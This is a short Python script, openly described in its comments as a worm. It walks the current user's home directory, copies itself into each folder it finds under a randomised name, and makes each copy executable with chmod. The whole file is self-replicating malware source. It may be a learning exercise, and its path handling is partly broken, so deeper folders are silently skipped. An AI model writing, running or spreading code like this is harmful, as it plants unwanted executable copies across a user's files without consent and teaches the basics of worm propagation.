#!/usr/bin/env python3

from os import path, system, walk
from shutil import copyfile
from getpass import getuser
from random import random


def get_file_info():

	#get the name of the current iteration of the worm
	filename = path.basename(__file__)

	#find the current location of the worm file
	location = path.abspath(filename)

	#get the username of Linux user to know the home folder location
	user = getuser()

	return filename, location, user

def replicate(filename, location, user, name):

	#generate random string to differentiate files while testing
	noise = str(random())

	#set destination to the user's Documents folder
	destination = "/home/"+user+"/"+name+"/"+"wormreplicate"+noise+".py"

	#Copies our file into the new location
	copyfile(location,destination)
	
	print("The worm has been copied.")
	return destination

def make_executable(destination):

	#sets a command to make a file executable	
	cmd = "chmod +x" + " " + destination

	#run the command
	system(cmd)
	

def main():
	filename, location, user = get_file_info()
	for root, dirs, files in walk("/home/"+user+"/"):
			for name in dirs:
				try:
					destination = replicate(filename, location, user, name)
					make_executable(destination)
					print(destination)
				except PermissionError:
					continue
				except FileNotFoundError:
					continue


if __name__ == "__main__":
	main()
